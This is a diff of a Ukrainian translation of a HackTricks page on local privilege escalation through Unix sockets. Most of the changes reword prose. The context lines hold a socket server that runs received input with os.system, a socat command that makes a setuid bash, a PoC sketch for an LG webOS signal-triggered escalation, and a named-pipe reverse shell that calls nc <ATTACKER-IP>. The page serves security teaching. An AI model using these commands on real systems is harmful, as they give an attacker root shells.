@@ -2,9 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Socket binding example with Python
+## Socket binding приклад з Python
 
-У наведеному прикладі **unix socket створюється** (`/tmp/socket_test.s`) і все, що **отримується**, буде **виконано** за допомогою `os.system`. Я розумію, що ви не знайдете цього в реальному житті, але мета цього прикладу — показати, як виглядає код, що використовує unix sockets, і як обробляти вхідні дані в найгіршому можливому випадку.
+У наступному прикладі **unix socket створюється** (`/tmp/socket_test.s`), і все, що **отримується**, буде **виконане** за допомогою `os.system`. Я знаю, що ви навряд чи знайдете це в реальному житті, але мета цього прикладу — побачити, як виглядає код, що використовує unix sockets, і як обробляти вхідні дані у найгіршому можливому випадку.
 ```python:s.py
 import socket
 import os, os.path
@@ -26,7 +26,7 @@ print(datagram)
 os.system(datagram)
 conn.close()
 ```
-**Виконайте** код за допомогою python: `python s.py` і **перевірте, як socket прослуховує**:
+**Виконайте** код за допомогою python: `python s.py` і **перевірте, як socket слухає**:
 ```python
 netstat -a -p --unix | grep "socket_test"
 (Not all processes could be identified, non-owned process info
@@ -39,13 +39,13 @@ echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat -
 ```
 ## Кейс: Root-owned UNIX socket signal-triggered escalation (LG webOS)
 
-Деякі привілейовані демони відкривають root-owned UNIX socket, який приймає untrusted input і пов'язує привілейовані дії з thread-IDs та signals. Якщо протокол дозволяє unprivileged client впливати на те, який native thread буде ціллю, ви можете зуміти викликати привілейований код і escalate.
+Деякі привілейовані демони відкривають root-owned UNIX socket, який приймає ненадійний ввід і пов'язує привілейовані дії з thread-IDs та signals. Якщо протокол дозволяє непривілейованому клієнту впливати на те, який native thread буде націлений, ви можете спровокувати виконання привілейованого коду і підвищити привілеї.
 
-Спостережуваний шаблон:
+Спостережуваний патерн:
 - Підключитися до root-owned socket (e.g., /tmp/remotelogger).
 - Створити thread і отримати його native thread id (TID).
-- Надіслати TID (packed) плюс padding як запит; отримати acknowledgement.
-- Надіслати конкретний signal цьому TID, щоб trigger привілейовану поведінку.
+- Відправити TID (packed) плюс padding як запит; отримати підтвердження.
+- Надіслати конкретний сигнал цьому TID, щоб викликати привілейовану поведінку.
 
 Мінімальний PoC ескіз:
 ```python
@@ -59,14 +59,13 @@ s.sendall(struct.pack('<L', tid) + b'A'*0x80)
 s.recv(4)  # sync
 os.kill(tid, 4)  # deliver SIGILL (example from the case)
 ```
-Щоб перетворити це на root shell, можна використати простий named-pipe + nc pattern:
+Щоб перетворити це на root shell, можна використати просту схему named-pipe + nc:
 ```bash
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
-Примітки:
-- Цей клас помилок виникає через довіру до значень, отриманих із непривілейованого стану клієнта (TIDs), і прив'язування їх до привілейованих signal handlers або логіки.
-- Зміцніть безпеку, вимагаючи credentials на socket, перевіряючи формати повідомлень та відокремлюючи привілейовані операції від зовні переданих thread identifiers.
+- Цей клас багів виникає через довіру до значень, отриманих із непривілейованого стану клієнта (TIDs), та прив'язку їх до привілейованих обробників сигналів або логіки.
+- Посилюйте захист, застосовуючи перевірку credentials на socket, валідацію форматів повідомлень та відокремлення привілейованих операцій від зовнішньо наданих thread identifiers.
 
 ## Посилання
 
